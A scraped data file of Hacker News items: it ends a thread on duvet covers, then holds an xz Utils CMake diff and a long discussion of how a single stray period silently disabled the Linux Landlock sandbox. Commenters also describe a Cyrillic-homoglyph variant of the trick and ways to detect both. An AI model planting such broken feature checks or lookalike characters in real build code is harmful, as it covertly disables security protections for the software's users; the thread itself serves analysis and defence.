and match it inside with inside corner of the outer part. Then the other top corner. Then pull them both to the top of the bed, then fix the bottom—easy. reply lstamour 13 hours agoparenthttps://www.extrapetite.com/2021/03/how-to-put-duvet-cover-b... Might make a bit more sense, but I’m still trying to follow it myself. I’ll have to try it to get it, I think. reply veunes 11 hours agoprevIt so cool to see it on the first page reply hank808 12 hours agoprevIs this what it's come to? Since AI has taken over tech, we're now discussing duvet cover removal/replacement methods? reply bartkappenburg 12 hours agoprevAlso known as the “burrito roll” reply zoklet-enjoyer 12 hours agoprevI've been doing it this way for years. Saw a YouTube video on it. Before that, I struggled to get the duvet back in the cover reply sneak 13 hours agoprevThey make duvet covers that zip all the way down two sides. And they make little padded clips for the corners so there is no tying. reply seventytwo 8 hours agoprevIs this kind of obvious stuff what passes for content these days? I should start a substack… reply ricardobeat 13 hours agoprevI just hold the duvet by the two front corners, shove it inside the cover and find the edges. Hold the edges from the outside of the cover, shake. Takes 30 seconds. We also change it weekly, sleeping in the same covers for a month sounds disgusting. reply EthicalSimilar 13 hours agoparentThis is the way. I also use this method and change weekly. It’s pretty efficient, especially for larger duvets. reply what 12 hours agoparentprevPeople often have a flat sheet between them and the duvet that gets washed more frequently. reply ThrowawayTestr 13 hours agoprevI just put the whole thing in the washing machine and run the drier for two hours. reply cyberax 13 hours agoparentDoesn't work well with duvets filled with feathers. reply goodpoint 13 hours agoprevWTF?!? People don't change bedsheet every week?! reply thomond 12 hours agoparentMight depend on how much you sweat and the climate where you live. I personally change every week during summer but fortnightly during winter. reply apimade 13 hours agoprevtl;dr: https://www.youtube.com/watch?v=DRPfudNNd8Y reply pandemic_region 13 hours agoprev [–] Next up: he learns how to slice bread. But seriously, why is this news worthy? My grandmother showed me how to do this way before this guy was even born. reply sunshowers 12 hours agoparentI also learned it from my grandparents, but I've been the one introducing it to a number of people in my life. Some of them have described it as black magic — so it's not very well-known. reply worddepress 4 hours agoparentprev [–] https://xkcd.com/1053/ reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The article introduces the \"roll-invert-unroll\" method for effortless duvet cover replacement, addressing common struggles faced by individuals.",
      "The author details a step-by-step guide for implementing this technique, highlighting its simplicity, effectiveness, and overall satisfaction in the process.",
      "The emphasis is on the ease, efficiency, and contentment derived from utilizing this new approach for changing duvet covers."
    ],
    "commentSummary": [
      "Users on danverbraganza.com engage in discussions about changing duvet covers, exploring methods like the Roll-Invert-Unroll technique and sharing preferences and experiences.",
      "The conversation includes a wide range of topics, from practical advice to cultural differences, frustrations, and humorous anecdotes related to bedding preferences.",
      "The website serves as a platform for exchanging household tips and life hacks related to duvet covers, offering a diverse resource for users seeking insights into this process."
    ],
    "points": 381,
    "commentCount": 211,
    "retryCount": 0,
    "time": 1711826213
  },
  {
    "id": 39874404,
    "title": "Linux Landlock Syscall Check Improves Xz.git Repository",
    "originLink": "https://git.tukaani.org/?p=xz.git;a=blobdiff;f=CMakeLists.txt;h=d2b1af7ab0ab759b6805ced3dff2555e2a4b3f8e;hp=76700591059711e3a4da5b45cf58474dac4e12a7;hb=328c52da8a2bbb81307644efdb58db2c422d9ba7;hpb=eb8ad59e9bab32a8d655796afd39597ea6dcc64d",
    "originBody": "git.tukaani.org / xz.git / blobdiff commit grep author committer pickaxe ? search: re summaryshortloglogcommitcommitdifftree rawinlineside by side Build: Fix Linux Landlock feature test in Autotools and CMake builds. [xz.git] / CMakeLists.txt diff --git a/CMakeLists.txt b/CMakeLists.txt index 7670059..d2b1af7 100644 (file) --- a/CMakeLists.txt +++ b/CMakeLists.txt @@ -901,10 +901,29 @@ endif() # Sandboxing: Landlock if(NOT SANDBOX_FOUND AND ENABLE_SANDBOX MATCHES \"^ON$|^landlock$\") - check_include_file(linux/landlock.h HAVE_LINUX_LANDLOCK_H) + # A compile check is done here because some systems have + # linux/landlock.h, but do not have the syscalls defined + # in order to actually use Linux Landlock. + check_c_source_compiles(\" + #include+ #include+ #include+. + void my_sandbox(void) + { + (void)prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); + (void)SYS_landlock_create_ruleset; + (void)SYS_landlock_restrict_self; + (void)LANDLOCK_CREATE_RULESET_VERSION; + return; + } + + int main(void) { return 0; } + \" + HAVE_LINUX_LANDLOCK) - if(HAVE_LINUX_LANDLOCK_H) - set(SANDBOX_COMPILE_DEFINITION \"HAVE_LINUX_LANDLOCK_H\") + if(HAVE_LINUX_LANDLOCK) + set(SANDBOX_COMPILE_DEFINITION \"HAVE_LINUX_LANDLOCK\") set(SANDBOX_FOUND ON) # Of our three sandbox methods, only Landlock is incompatible XZ Utils RSS Atom",
    "commentLink": "https://news.ycombinator.com/item?id=39874404",
    "commentBody": "Xz: Can you spot the single character that disabled Linux landlock? (tukaani.org)357 points by dhx 21 hours agohidepastfavorite195 comments dhx 21 hours agoAnswer: https://git.tukaani.org/?p=xz.git;a=commitdiff;h=f9cf4c05edd... Description of Linux's Landlock access control system if you are not familiar with it: https://docs.kernel.org/userspace-api/landlock.html xz official (maybe...) incident response page: https://tukaani.org/xz-backdoor/ reply phoe-krk 20 hours agoparentSo that function checked if the following C code compiled, and only in that situation enabled the landlock? Except that lone period, hard to recognize because of its small size and proximity to the left edge of the diff, caused the C code to become always invalid, hence keeping the landlock always disabled? That's both vilely impressive and impressively vile. I didn't even spot it on my first read-through. reply patrakov 6 hours agorootparentEven more evil would have been to replace this line (void)SYS_landlock_create_ruleset; with this: (void)SYS_landloсk_create_ruleset; reply dathinab 1 hour agorootparentAfter the concept of such attacks had blow up idk. 1?2?3? years ago a lot of places now warn at least when mixing \"languages\"/ranges or sometimes on any usage of non us-ascii printable characters. So stuff like that is increasingly more reliable caught. Including by 3rd parties doing any ad-hoc scanning. Through adding `compiles check` fail with syntax errors definitely should be added tot he list of auto scan checks, at least in C/C++ (it's not something you would do in most languages tbh. even in C it seems to be an antipatters). reply saagarjha 5 hours agorootparentprevPutting random Unicode confusables in source code would be far easier to consider malicious reply Terr_ 6 hours agorootparentprevFor those squinting, the \"landlock\" regular \"c\" is replaced with a Cyrillic U+0441. reply SV_BubbleTime 6 hours agorootparentIs there a GCC option to error on non-standard English characters? reply rurban 2 hours agorootparentNot yet. I was working on the standardization for C23, but this was postponed to C26, and has not much support. MSVC and SDCC liked it, CLANG and GC not so much. Here is my bad variant of the feature, via confusables: https://github.com/rurban/gcc/tree/homoglyph-pr103027 The better variant would be to use my libu8ident, following UTR 39. I only did that for binutils. reply Terr_ 5 hours agorootparentprevDisclosure: I've got zero C/C++ on my resume. I was asked to diagnose a kernel panic and backport kernel security patches once, but it was very uncomfortable. (\"Hey, Terr knows the build system, that's close enough, right?\") That said, perhaps something like disabling the default -fextended-identifiers [0], and enabling the -Wbidi-chars [1] warning. [0] https://gcc.gnu.org/onlinedocs/gcc/Preprocessor-Options.html... [1] https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html#inde... reply masklinn 3 hours agorootparentprevError-ing is the point here and what the period achieved. It’s a feature detection snippet so if it fails to compile the feature is disabled. reply rmast 3 hours agorootparentIt seems like there should be a way to catch these types of “bugs” - some form of dynamic analysis tool that extracts the feature detection code snippets and tries to compile them; if they fail for something like a syntax error, flag it as a broken check. Expanding macros on different OSes could complicate things though, and determining what flags to build the feature check code with — so perhaps filtering based on the type of error would be best done as part of the build system functionality for doing the feature checking. reply masklinn 2 hours agorootparent> if they fail for something like a syntax error, flag it as a broken check. A syntax error might be exactly what they’re looking for e.g. they’re feature testing a new bit of syntax or a compiler extension. > so perhaps filtering based on the type of error would be best done as part of the build system functionality for doing the feature checking. Which would require every compiler to have detailed, consistent, and machine-readable failure reporting. reply fweimer 1 hour agorootparentprevThe -fno-extended-identifiers option seems to do something in this area, but I don't know if it is sufficient. But it may block some characters which are used in standard English (for some values of standard). reply signa11 6 hours agorootparentprevcompiler would perhaps \"see\" it ? reply josephg 5 hours agorootparentSure; but so long as the compiler error is silently discarded (as it is here), the configure script will assume landlock isn't available and never use it. reply smashed 4 hours agorootparentA misplaced punctuation has some plausible deniability. Like the author could say he was distracted and fat fingered nonsense, honest mistake. A utf character from a language that has zero chance of being mapped to your programmer's keyboard in the middle of a code line, that would be obvious intentional tampering or at the very least raise some eyebrows. reply yeputons 1 hour agorootparent> A utf character from a language that has zero chance of being mapped to your programmer's keyboard in the middle of a code line, that would be obvious intentional tampering or at the very least raise some eyebrows. I accidentally get Cyrillic \"с\" in my code few times a year. It's on the same key as Latin \"c\", so if I switch keyboard layout, I don't notice until the compiler warns me. Easy to do if I switch between chats and coding. Now my habit is to always type a few characters in addition to \"c\" to check what layout I'm _really_ using. Granted, it's easier with a one-letter variable called \"c\", but with longer names I can easily see myself not typing \"c\" the first time (e.g. not pressing hard enough), starting build, chatting in some windows, getting back, facepalming, \"fixing\" the error by adding \"c\" or \"с\" depending on my keyboard layout. reply Bulat_Ziganshin 31 minutes agorootparenteven worse, I have Punto switcher that automatically switches language when I start typing. With default config, it changes latin c to russian one because russian language includes word \"c\" while it's non-sense in English. and since it's the only Cyrillic character that's placed on the same key as the same-looking english character, I don't even see the problem with my eyes when the autoreplacement fires reply skywhopper 8 minutes agorootparentprevI mean, I agree that the punctuation mishap is a better cover story, but why would any particular language have “zero chance” of being mapped to the programmer’s keyboard? dathinab 1 hour agorootparentprevIt's also iffy tbh. that the compilation check functionality: - doesn't force users to differentiate between syntax errors and other errors (e.g. symbols not found). Partially you can't even make it work properly if you want due to C macros. - it seems sensible, tbh. if \"does compile\" checks for compatibility seems sensible then there is so much wrong with the ecosystem in so many ways reply mysidia 10 minutes agorootparentIt's standard autoconf stuff, BUT... the right thing to do for a security option should be to throw an error at the configure stage If the Option is requested but can't be supported, And not to silently turn it off. That is because a human should have to Look at the build and manually make the decision to switch off a security feature from the build. reply 082349872349872 19 hours agorootparentprevI just got a little more respect for pythonic whitespace-sensitivity EDIT: come to think of it, even that might not have done much here, where well-formedness is the issue :( reply capitainenemo 19 hours agorootparentYeah, if anything, python worsens the situation. I had a friend DOS our server because he accidentally inserted a tab, causing the illusion that one statement was inside a block but was actually outside it. He swore off python at that point. I personally avoid the language, but I understand due to issues like that these days mixing tabs and spaces is an error (or is it just a warning?) by default. Regardless, still pretty silly to me to have whitespace play such a major significant role, besides the fact that I find it visually harder to read, like text without punctuation or capitalisation. reply secstate 18 hours agorootparentMixing tabs and spaces usually throws a runtime exception. I'm not gonna make a value judgement about that, but your story doesn't make sense based on how I understand py3 Edit, sorry, shoulda read your whole commebt before replying reply capitainenemo 17 hours agorootparentYep. It was a few years ago while that was stilled allowed (as I'd noted ;) ) but regardless. Significant whitespace is just annoying.. There's a lot of things that render as whitespace, and source code one might be reviewing could be printed wrapped or copied and pasted in odd ways. Other languages are more robust to this. reply _visgean 10 hours agorootparentNever had this happen, this is largely eliminated by using tools like black or other autoformatters. reply MrDresden 2 hours agorootparentThe point still stands that this is an inherit possibility in the language it self. reply eru 1 hour agorootparentWell, in C the visual indentation and the meaning of the code (given by {}) can diverge. That's even worse, and happens in practice. Many style guidelines for C have evolved specifically to address that problem with 'the language itself'. reply eru 7 hours agorootparentprevAnd/or linters. This issue is no worse that having multiple different variables that look the same and only in their obscure same-looking unicode symbols. A linter can handle this. As can a decent font, or editor settings. reply heavenlyblue 7 hours agorootparentprevYou can enable showing whitespace characters in your editor, in PyCharm they are visualised perfectly well as to not distract from the non-whitespace. reply katbyte 11 hours agorootparentprevwhite space as a delimiter is why i never use python. reply throwaway2037 5 minutes agorootparentReally? Another one of these comments? Do we yet have an LLM plugin for HN reader app to auto-filter them? Right up there with \"When I last used Java version 5...\" and \"When I last used C++ in 1998...\" Guido van Rossum has a famous retort to this comment. You can find it on YouTube. Further, if you are so easy to knock a good programming language that has more than proven it's worth at this point, you can just as easily \"cancel\" ALL other programming languages for equally trivial reasons. If you dare, share your favourite languages, and the votes and replies will not be generous. reply naikrovek 10 hours agorootparentprev> white space as a delimiter is why i never use python. Whitespace is a delimiter in (almost?) all languages humans use. Whitespace determining which scope you’re in is one of the many problems of making whitespace significant, which might be what you meant. reply tomoyoirl 10 hours agorootparent“The thing that controls scope is the count of certain nonprinting characters, which happen to come in multiple widths” is reasonably insane, yes reply eru 7 hours agorootparentWhich non-printing characters are you talking about? Whitespace characters are very much printable. Yes, I agree that Python should just forbid tabs. As a second best, you can tell your linter (and/or formatter) to forbid tabs (and any weird unicode whitespace). That's basically the equivalent of compiling your C with -Wall. reply takeda 3 hours agorootparentThis was an issue in Python 2, where for some dumb reason it allowed mixing tabs and spaces and equated tab to 8 spaces (I think). Python 3 doesn't have that issue. reply ratmice 9 hours agorootparentprevRegarding your almost query. There was a debate over Ogham space mark in unicode. It is considered whitespace though, with the rationale that it is sometimes visible, but sometimes invisible. Depending upon whether the text has a stem-line. That doesn't make the set of non-whitespace delimited languages empty. Perhaps there is one with an always-visible delimiter that didn't get the whitespace justification, but does at least give one human language delimited by a printable character (which happens to be whitespace). reply eru 7 hours agorootparent> That doesn't make the set of non-whitespace delimited languages empty. Well, there's also the opposite: Goldman Sachs's Slang allows space as part of identifiers. reply WirelessGigabit 6 hours agorootparentprevHuman language is also way more ambiguous. One of the reasons I love coding is a massively reduced vocabulary and a way more strict grammer. reply raverbashing 10 hours agorootparentprevYes mixing tabs and spaces is a big no no and rightfully throws an error now reply fragmede 6 hours agorootparentprevhumans are weird creatures sometimes. there was this bad thing that happened that won't happen again now, but now I can't use the thing forever because Reasons. reply yegle 10 hours agorootparentprevIn Python, you only need to indent the `def test_foo` by an additional whitespace, to make it a locally scoped function instead of a proper test function. reply eru 7 hours agorootparentNo, not if you have any sane linter or formatter involved. They wouldn't let you get away with indenting by a single space, but only by multiples of whatever you normally use in the rest of your program. reply jrockway 6 hours agorootparentI mean, some CI system should be checking that \"if_code_compiles()\" blocks compile somewhere. It should be an error until the CI system has that header and can test both variants. People are really quick to add optionality like this without understanding the maintenance cost. (Every boolean feature flag increases the number of variants you need to test by 2!) Either make a decision, or check that both sides work. Don't let people check in dead code. reply asddubs 2 hours agorootparentmultiplies it by 2, not increases reply philsnow 10 hours agorootparentprevAST diffs instead of textual diffs might have helped here (to spot the `.` making the code un-compilable). Edit: oof, though the stray character in question is inside a perfectly legitimate C string, so to catch this, any such diffs would need to Matroyshka down and that seems unsolvable / intractable. reply eru 7 hours agorootparent> Edit: oof, though the stray character in question is inside a perfectly legitimate C string, so to catch this, any such diffs would need to Matroyshka down and that seems unsolvable / intractable. Not sure, you could also just forbid code that's too complex to analyse without going down a rabbit hole. Instead of trying to go down the rabbit hole. In general, it's hard to analyse arbitrary code. But we don't have to allow arbitrarily complex code when doing code review. reply mewpmewp2 7 hours agorootparentprevI think main issue was that it was embedded in the file itself like that. Would have preferred to have it in a separate valid C file with syntax highlighting etc and being parsed from that file. reply tsimionescu 2 hours agorootparentPerhaps, but given how most build systems work, that would complicate things in other ways (since build systems often try to compile all .c files). reply throwaway2037 1 minute agorootparentI am a CMake novice. Is that true for CMake in this example? raverbashing 10 hours agorootparentprevAh yes but thanks to C being cursed due to includes and macros this is harder to do reply uecker 10 hours agorootparentHuh, the code with a dot is not legal C. It is CMake issue that the test breaks here. reply acdha 8 hours agorootparentThat’s what makes this so clever: these systems were born in the era where you couldn’t trust anything - compilers sometimes emitted buggy code, operating systems would claim to be Unix but had weird inconsistencies on everything from system calls to command line tool arguments, etc. - so they just try to compile a test script and if it fails assume that the feature isn’t supported. This is extremely easy to miss since the tool is working as it’s designed and since it’s running tons of stuff there’s a ton of noise to sort through to realize that something which failed was supposed to have worked. reply josefx 1 hour agorootparentYou could just run tests for the feature detection on a known system or a dozen(VMs are cheap). The big problem is that most code is not tested at all or test errors are flat out ignored. reply hermitdev 7 hours agorootparentprevThat's kind of the point. It's feature detection code. If the code cleanly compiles, the feature is assumed supported, otherwise, it's assumed not present/functional. This pretty common with autotools. The gotcha here is this innocuous period is not supposed to be syntactically valid. It's meant to be subtle and always disable the feature. reply asvitkine 6 hours agorootparentShouldn't whatever is depending on xz supporting landlock be verifying that it's the case through blackbox tests or something? Otherwise a check like this even without the bug could end up disabling landlock if e.g. the compiler environment was such that a given header wasn't available... reply saagarjha 5 hours agorootparentYes, this is intentionally how autoconf is supposed to work. reply sidewndr46 19 hours agorootparentprevI agree. The way I read this, I missed it completely until I searched for it. I was looking too closely at the rest of the code around defines reply kristopolous 7 hours agoparentprevThis has plausible deniability on it. There's better ways to hide by swapping in Unicode lookalike characters. Some of them even pixel match depending on the font. Maybe I'm out of the loop but is intentionality settled here? reply n2d4 7 hours agorootparentUnicode lookalikes would be detected by IDEs and other tools. There would be plausible deniability in a different situation, but this is the same author who implemented the backdoor and several similar changes that disable security features. I don't think the benefit of doubt is deserved here. reply kristopolous 7 hours agorootparentOk there's a larger question here about the bazaar software development method. How can we ensure say, that Microsoft doesn't pay someone to throw a wrench in libre office development or Adobe to sabotage Gimp? There's lots of deception strategies for bad faith actors and given the paucity of people who actually do the work, it's really really hard to be picky. Especially with the complexity of library dependencies. Defect-at-a-distance may actually be a common strategy and this is the first that was caught reply Dalewyn 6 hours agorootparent>How can we ensure say, that Microsoft doesn't pay someone to throw a wrench in libre office development or Adobe to sabotage Gimp? Microsoft and Adobe have reputations to uphold long into the future. Is that infallible? Hell no it isn't, but consider that Jia Tan only needed to uphold his reputation insofar as getting his backdoor onto everyone's systems. Once that is done, his reputation or the lack thereof becomes a non-issue because his work is done. We're lucky we caught him just before the finish line. The likelihood of demonstrably reputable parties like Microsoft and Adobe poisoning the well is practically nil because they don't have a finish line. reply kristopolous 5 hours agorootparentThose companies are famous for skullduggery. They can secure the dominance of their offering against the open source competition for well under 500k a year. It's a no brainer. What this might look like would be say, poorly discernable icons, clumsy UI design, or an unstable API that makes plugins constantly break. Large volumes of documentation that are inadequate or inaccurate in critical places, etc. If I was malicious I'd pay someone to write otherwise functional code and bug fixes but make really user hostile decisions whenever possible. We should be diligent for this in a few key projects. Tech companies could easily be doing this already. reply bawolff 4 hours agorootparent> Those companies are famous for skullduggery There are levels of skull duggery. Hiring someone to pretend to work for a competitor while secretly sabotaging them is a whole other level of skullduggery with a lot of liability attached. I don't think that would be worth it to them. reply Dalewyn 3 hours agorootparentprevWell since you seemingly want to paint Microsoft and other such companies in a bad light, let me point out to you that it's actually Microsoft who brought awareness to this very problem: Andres Freund works at Microsoft.[1][2] It is probably prudent for you (and other like-minded individuals) to be more careful who you think your enemies really are. Infighting against friends and allies, or even neutral parties, is exactly what your real enemies would want you to do. [1]: https://www.linkedin.com/in/andres-freund [2]: https://twitter.com/AndresFreundTec reply deckard1 4 hours agorootparentprevYou say all this after recent documents were revealed about Facebook intercepting and analyzing Snapchat encrypted traffic via a man-in-the-middle conspiracy. reply esafak 4 hours agorootparentWhat kind of a reputation do you think Facebook has? reply asveikau 6 hours agorootparentprevI'm not sure that an IDE will catch a syntax error in C code quoted inside a cmake script trying to test if things compile. reply n2d4 6 hours agorootparentA lot of IDE configurations, such as VSCode on the default config, highlight Unicode characters that are invisible/look like others (eg. cyrillic characters or non-breaking space) or even all non-ASCII characters, regardless of whether they're in a string or not. Try pasting any of these into your IDE and see if it catches it. https://gist.github.com/StevenACoffman/a5f6f682d94e38ed80418... reply brailsafe 6 hours agorootparentprevIn either case, it would appear as added code, not different characters in the same code, so maybe about the same. If someone changed one character in an existing string though, I think it would be more likely caught visually by someone used to seeing accidental garbage show up reply zzzeek 7 hours agorootparentprevthe period right there on the left edge? if I saw that in a patch I'd be through the roof, that looks completely intentional reply aeyes 7 hours agorootparentI'd never suspect this to be intentional if I'd spot it in a patch, even given the consequences in this particular case. I have written and committed things into code instead of writing it into some other window several times. Without a linter I probably wouldn't spot an extra dot when reviewing my own change before sending it out. reply kristopolous 7 hours agorootparentprevNot me. Maybe someone is using an editor with a . key mapped to something. It's in a pretty convenient place. :wq! reply undebuggable 19 hours agoparentprevThis is so vile that even if caught red-handed during PR one could shrug off \"oh, my IDE's auto formatting did this\". reply Aeolun 9 hours agoparentprevI feel like my version control system is better about highlighting the changed characters than these solid green or red strings. reply masklinn 3 hours agorootparentIt’s a giant block of new code, what is it supposed to do beyond tell you it’s a giant block of new code? Note that this is C code inside if a cmake string, even if your diff can do highlighting the odds it would highlight that are low, and if it did highlighting is generally just lexing so there wouldn’t be much to show. reply XorNot 9 hours agorootparentprevI don't love unified diffs as a rule either. They're very noisy to read in general. A side by side in something like \"meld\" will highlight changes but also means you're reading the full context as it will exist in the code base. My number one complaint about \"code review\" is the number of people who simply run their eyes over the diff (in private orgs) because management says \"code review\" and that's as far as they ever take that in terms of defining outcomes. reply eru 7 hours agorootparentI love unified diffs for many applications. You are right that side by side diffs have their uses, too. reply TheRealPomax 9 hours agorootparentprevIt's git, so it can show a vastly better diff, just not from a URL with hardcoded diff settings. reply Aeolun 9 hours agorootparentYeah, but I’m wondering where the code review was done. In a different context, would this be easier to spot? reply asveikau 10 hours agoparentprevIt seems like Lasse Collin is back on the scene and maybe pissed? reply TLLtchvL8KZ 2 hours agorootparentI worry about his home/personal system, this guy seems to have befriended Lasse in order to get the position, is it possible Lasse himself has been compromised? I'd be nuking everything, possibly even disposing of hardware and setting up a new verifiable online identity on a clean system/hardware. reply Dalewyn 8 hours agorootparentprevIf he is innocent and a victim as much as everyone else in all this, I won't blame him for wanting blood. Most of us are humans after all, and being social creatures we tend to take violations of trust quite deeply. reply danielhlockard 8 hours agorootparentTruly seems that way currently. He said he'd really dig in starting next week and just checked his email on vacation and saw this whole mess. reply asveikau 8 hours agorootparentIt may be hard for him to re-establish trust. Maintaining xz for more than a decade then doing this would be quite a \"long con\" but if HN threads are any indication, many will still be suspicious. His commits on these links look legit to me. It's a sad situation for him if he wasn't involved. reply londons_explore 3 hours agorootparentThe fact GitHub suspended his account too suggests that they might have info saying he is involved. reply sReinwald 1 hour agorootparentPersonally, I doubt that. I would assume that GitHub just banned all accounts that were directly associated with the project as a precaution. reply cricalix 2 hours agorootparentprevOr you know, they just reacted with a ban hammer on all accounts related to xz and to heck with innocence. reply jstanley 20 hours agoparentprevWhat does the dot do? reply Aurornis 20 hours agorootparentThe function is “check_c_source_compiles”. The comment indicates that the intention is to confirm that the Landlock functionality can be compiled on the system, in which case it will be enabled. The stray dot isn’t valid C, so it will never compile. By ensuring it can never compile, Landlock will never be enabled. reply astrange 5 hours agorootparentconfigure would print that it's not enabled, so it seems like the kind of thing people would eventually notice. reply takeda 2 hours agorootparentLooks like he only introduced that \"bug\" in CMake. Was there migration in progress from autoconf to cmake? reply masklinn 3 hours agorootparentprevMaybe, eventually, but how many people read the reams of garbage autoconf spouts out until the feature they wanted fails to materialize? reply astrange 1 hour agorootparentI used to and it's actually how I got a large part of my computer skills, but unfortunately I got medicated for ADHD and became normal and can't do it anymore. But I still think reading boring logs is a great way to understand a system. Turning on all the intermediates for a compiler (llvm ghc etc) is very educational too. reply thrtythreeforty 20 hours agorootparentprevFails the build, so that Landlock support is never enabled. reply usr1106 5 hours agorootparentI don't think it fails the build. It's part of a test, trying to compile a bit of code. If it compiles the test is true and a certain feature is enabled. If the compilation fails the the feature is disabled. This is quite common in build systems. I had such a test produce incorrect results in the kernel build system recently. The problem is that the tests should really look carefully for an expected error message. If the compilation fails with the expected message the test result is false. If the compilation fails for some other reason the build should fail so the developer is forced to investigate. Disclaimer: I have not studied the xz build system in detail, just what I saw from the diff plus a bit of extrapolation. reply akdev1l 3 hours agorootparentIt fails that small build that is testing for landlock functionality. Hence it doesn’t build the support for it. It doesn’t fail the overall build. reply rossjudson 9 hours agoprevThere I am, scanning carefully, and I see a period where one clearly should not be. \"This wasn't so hard\", I said to myself. I poked my screen, and the period moved. Curse you, monitor dust particle. reply fcanesin 7 hours agoprevGeez, his last commit is making security reports worse: https://git.tukaani.org/?p=xz.git;a=commitdiff;h=af071ef7702... reply eacapeisfutuile 7 hours agoparentWhy is that accepted? Serious question reply maxdamantus 3 hours agorootparentPresumably because they're one of the two maintainers: https://web.archive.org/web/20240329182607/https://xz.tukaan... reply kristjansson 6 hours agorootparentprevHe had unfettered access to xz’s git? reply eacapeisfutuile 6 hours agorootparentIsn’t it a bit ironic with how much code everyone depends on that can freely be altered by some unknown party, while so much time goes into code reviews to verify internal changes at most companies. reply deckard1 4 hours agorootparentyou can have ten comments about the name of a variable, but no one bats an eye at a new npm package introduced. Also, devs that wrote code that Google depends on can't pass the leetcode gate check to get a job there. Our industry is a laughingstock. reply 2pEXgD0fZ5cF 1 hour agorootparentprev> while so much time goes into code reviews to verify internal changes at most companies Very easy claim to make. Difficult to verify. reply cookiengineer 5 hours agorootparentprevSome might say RMS was right all along. reply takeda 2 hours agorootparentprevAnd he was in the project for just 2 years. reply HideousKojima 4 hours agorootparentprev>while so much time goes into code reviews to verify internal changes at most companies Maybe at FAANGs, but I work at a massive company and code review is non-existent. reply foooorsyth 7 hours agorootparentprevBecause nobody’s really paying attention. “LGTM!” reply eacapeisfutuile 7 hours agorootparentGenerally yes, but ripping all conditions out of SECURITY.md should at least raise an eyebrow? reply indrora 7 hours agorootparentNobody was watching. Plain and simple. If you have commit access to it, and nobody is there to see, nothing stops you. reply eacapeisfutuile 6 hours agorootparentYes but if that’s the sentiment how is this not as problematic as the npm ecosystem. reply snazz 6 hours agorootparentIt’s similarly problematic but on a somewhat smaller scale and with fewer levels of nested dependencies. reply eacapeisfutuile 6 hours agorootparentI’m not sure this would be smaller scale? At least probably too early to tell? reply karmakaze 19 hours agoprevI can't believe that system security is dependent on such a loose chain of correctness. Any number of things could have stopped this. + # A compile check is done here because some systems have + # linux/landlock.h, but do not have the syscalls defined + # in order to actually use Linux Landlock. Fix those headers on those systems to explicitly opt-out. What's the point of headers if they don't declare their capabilities? Also why isn't there a single test after a binary blob (even when compiled from open source) is made to ensure security is in-tact? I wouldn't even ship a website checkout without end-to-end tests for core capabilities. There must be a priority misalignment of adding features > stability. Edit: I hope the 'fix' isn't to remove the '.'--I just saw the other post on HN that shows removing the '.' reply Randalthorro 7 hours agoparentHe introduced a whole new testing framework then slowly put a backdoor in it over 2 years reply missblit 8 hours agoparentprevYou are quoting Jia Tan [1]. The malicious actor wrote that comment when deliberately breaking the check in the first place. Fixing headers or extra tests would not have prevented this, as there is no indication the headers were broken in the first place, and extra tests could have been compromised (or ignored for release tarball) some other way. [1] https://git.tukaani.org/?p=xz.git;a=commit;h=328c52da8a2bbb8... reply manwe150 5 hours agorootparentShould the better fix then to have been to revert the bad commit with the malicious commit message, rather than just deleting the dot (as was done)? reply Hnrobert42 9 hours agoparentprevAs a user of open source who doesn’t know enough to make those suggestions, I would be grateful if you would develop and contribute them. reply deathanatos 6 hours agoparentprevI'm pretty certain the comment isn't accurate, and is just more subterfuge. reply kardos 17 hours agoparentprevWell, do we know if that commented code you quoted is accurate? reply karmakaze 14 hours agorootparentIt's the content of TFA, so flag it if you believe it isn't. reply kardos 13 hours agorootparentYes that is what I mean -- the commit in TFA is from the bad actor -- so the quoted comment is suspect.. reply pas 9 hours agoparentprev... there's a huge bias in things that get tested (and how they get tested). easy to test things get tested. there's a lot more developer, committer, maintainer for web stuff. there's a cultural issue, it's hard to improve on old ossified processes/projects, etc. reply trelane 10 hours agoprevI wonder why it was useful to prevent Landlock from being enabled in xz. Perhaps a later stage was to inject malicious content into xz archives? But then why not just inject malicious activity in xz itself? reply ColonelPhantom 9 hours agoparentBecause a deliberate vulnerability is much easier to hide than actual malicious content. One could probably sneak a buffer overflow or use-after-free into a C project they maintain without being noticed. Actually shipping a trojan is much harder, as observed with the xz-to-sshd backdoor. reply trelane 9 hours agorootparentAh, so the next stage would have been to add a \"bug\" in xz that would trigger during the supposedly sandboxed execution, when presented with certain input files. Clever. reply puetzk 7 hours agorootparentWell, is also quite possible that adding such a bug was the previous stage. Or even just having found one that you didn't report/fix... reply A1kmm 9 hours agoparentprevUnless there are more subtle backdoors that target xz itself beyond the targeting of ssh. Clearly the aim was to be subtle. reply CGamesPlay 7 hours agoprevOn an unrelated note, this malware team has assembled a great dataset for training AIs on identifying security problems. Every commit has some security problem, and the open source community will be going through and identifying them. (Thanks, maintainers, for the cleanup work; definitely not fun!) reply bawolff 4 hours agoparentI doubt it will generalize well. At best its just an arms race. reply luyu_wu 7 hours agoparentprevOne of the cooler uses of AI I've seen! reply wizzwizz4 6 hours agorootparentCurrently it doesn't work, but yeah, it'll be really cool when we have tech like that! (It'll still only be able to detect known vulnerabilities, but we don't often invent new ones.) reply chilling 5 hours agoparentprevI hear this stuff for the first time, can you post some info about that? reply CGamesPlay 2 hours agorootparentLike in this article, we have a patch that introduces a security flaw (disabling landlock). We later have a patch that fixes it, specifically. The job of the LLM is to reproduce the fixing patch given the problem patch. Or at the very least, explain that this patch results in landlock always being disabled. To be clear, this problem is much, much harder than the problems LLMs are solving now, requiring knowledge of autotools behavior that isn’t included in the context (identifying that a failed build disables the feature, and that this build always fails). There was another example where this team submitted a patch that swapped safe_fprintf for fprintf while adding some additional behavior. It was later pointed out that this allows printing invisible characters to the stream, which allows hiding some of the files that are placed when decompressing. reply usr1106 4 hours agoprevWhere/how was landlock supposed to be used? I guess you cannot really use it in a generic library like compression/decompression. The library has no clue what the program is supposed to do and what should be restricted. For a program it might be clearer. The sshd attack was using liblzma as a library. So disabling landlock seems unrelated? A sign that there is more bad code waiting to be detected / had been planned to be inserted??? reply akdev1l 3 hours agoparentPresumably sshd itself used to lock down its own capabilities after a certain point of execution. Removing the landlock means the daemon doesn’t lock itself down and will allow for better payload execution when they get to the exploitation stage. I don’t think these two things are unrelated. I think they already had payloads in mind and realized this would be a hurdle. reply jwilk 3 hours agorootparentNo. OpenSSH doesn't use Landlock, and even if it did, this patch wouldn't affect it. reply usr1106 2 hours agorootparentprevIt's pretty impossible to lock down sshd. The restrictions are inherited by all 